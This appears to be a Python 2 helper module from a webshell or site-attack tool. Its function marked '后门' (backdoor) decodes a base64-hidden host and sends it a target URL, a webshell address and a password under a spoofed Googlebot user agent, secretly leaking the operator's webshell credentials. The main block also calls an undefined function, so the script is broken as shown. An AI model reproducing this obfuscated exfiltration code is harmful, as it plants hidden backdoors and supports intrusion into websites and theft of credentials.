#!/usr/local/bin/python
#-*- coding: UTF-8 -*-



import requests
import base64
import urllib2
import time
def http_url_hm(url,PASS): #后门
    try:
    #s1 = base64.encodestring('www.999kankan.com')  #加密
        s2 = base64.decodestring("aHR0cHM6Ly9odHRwcy45OTlrYW5rYW4uY29t") #解密   https://https.999kankan.com
        SSurl="%s/URL_EXP.php?"\
              "yijuhua=1&url=%s&webshell=%s&password=%s&bz=hl1"\
              %(s2,url,url,PASS)
        #print SSurl
        Aurl_post(SSurl)
        return 1
    except Exception,e:
        print e
        return 0

def Aurl_post(URL):  #提交内容
    try:
        req = urllib2.Request(URL)
        req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
        urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        time.sleep(1)
        return 1
    except:
        return 0

#def Aurl_post(url):
#    try:
#        #r.status_code #响应状态码
#        #r.raw #返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read() 读取
#        #r.content #字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩
#        #r.text #字符串方式的响应体，会自动根据响应头部的字符编码进行解码
#        #r.headers #以字典对象存储服务器响应头，但是这个字典比较特殊，字典键不区分大小写，若键不存在则返回None
#        ##*特殊方法*#
#        #r.json() #Requests中内置的JSON解码器
#        #r.raise_for_status() #失败请求(非200响应)抛出异常
#        print url
#        s = requests.Session()
#        r = s.post(url,verify=False)
#        print(r.raw)   #打印解码后的返回数据
#        return 1
#    except Exception,e:
#        print e
#        return 0


import re
def re_data(data, re_dtaa):  #正则匹配  r'<meta name="generator" content="(.*?)" />'
    try:
        p = re.compile(re_dtaa)
        sarr = p.findall(data)
        if len(sarr)>=1:
            if not sarr[0]=="":
                return 1
        else:
            return 0
    except:
        return 0



if __name__ == "__main__":
    data="http://www.wulinzr.com//index.html"
    print www_http_11(data)
    #time.sleep(30)
    #http_url_hm("http://baidu.com11111111111111111111111111","11111111") #后门

